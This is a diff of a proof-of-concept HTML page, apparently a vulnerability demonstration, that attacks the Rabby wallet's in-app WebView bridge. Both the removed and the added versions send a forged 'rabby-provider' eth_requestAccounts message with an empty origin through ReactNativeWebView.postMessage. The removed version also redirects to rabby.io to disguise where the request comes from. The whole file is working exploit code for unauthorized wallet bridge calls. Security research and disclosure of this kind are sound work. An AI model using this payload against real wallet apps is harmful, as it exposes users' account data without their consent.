@@ -1,45 +1,31 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Spoof Relay - poc2: 200</title>
-</head>
-<body>
-  <h2>Connecting Wallet…</h2>
-  <p id="msg">Please click the button to connect.</p>
-  <button id="connectBtn">Connect Wallet: 400</button>
-  <script>
-    window.addEventListener("message", function(event) {console.log(JSON.stringify(event.data))});
-    ReactNativeWebView.postMessage(
-        '{"name":"rabby-provider","data":{"method":"eth_requestAccounts","jsonrpc":"2.0","id":307038727,"toNative":true},"origin":""}'
-    );
+    <head>
+        <meta charset="UTF-8" />
+        <title>JSB安全问题</title>
+    </head>
+    <body>
+        <h2>越权调用JSB演示</h2>
+        <p id="msg">==== 信息记录 ====</p>
+        <button id="connectBtn">调用requestAccounts</button>
+        <script>
+            window.addEventListener("message", (event) => {
+                const data = event.data;
+                if (data.data != null && data.data.id === 307038727) {
+                    document.getElementById("msg").innerText += `\nrequestAccounts调用结果: ${JSON.stringify(data)}`;
+                }
+                document.getElementById("msg").innerText += `\n收到消息: ${data}`;
+            });
 
-    
-    document.getElementById('connectBtn').addEventListener('click', async () => {
-      if (!window.ethereum) {
-        document.getElementById('msg').innerText = 'No wallet installed!';
-        return;
-      }
-      try {
-        window.location = 'https://rabby.io';
-        setTimeout(async () => {
-          const accountsPromise = window.ethereum.request({
-            method: 'eth_requestAccounts'
-          });
-          try {
-            const accounts = await accountsPromise;
-            document.getElementById('msg').innerText =
-              'Connected: ' + accounts[0];
-          } catch (err) {
-            document.getElementById('msg').innerText = 'Connection failed';
-            console.error(err);
-          }
-        }, 400);
-      } catch (err) {
-        document.getElementById('msg').innerText = 'Unexpected error';
-        console.error(err);
-      }
-    });
-  </script>
-</body>
+            document
+                .getElementById("connectBtn")
+                .addEventListener("click", async () => {
+                    document.getElementById("msg").innerText +=
+                        "\n手动调用requestAccounts\n";
+                    ReactNativeWebView.postMessage(
+                        '{"name":"rabby-provider","data":{"method":"eth_requestAccounts","jsonrpc":"2.0","id":307038727,"toNative":true},"origin":""}'
+                    );
+                });
+        </script>
+    </body>
 </html>
